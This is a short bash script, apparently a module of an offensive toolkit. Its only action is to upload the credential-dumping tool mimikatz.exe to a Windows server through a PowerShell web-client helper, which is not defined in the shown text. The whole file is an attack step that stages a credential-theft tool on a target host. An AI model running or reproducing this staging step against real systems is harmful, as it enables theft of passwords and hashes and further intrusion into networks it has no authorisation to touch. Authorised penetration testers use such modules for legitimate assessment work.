#!/bin/bash

: '
ps: upload mimikatz to server
'

LOCATION="${SCRIPTS_DIR}/windows/mimikatz/.files"
FILE="mimikatz.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"
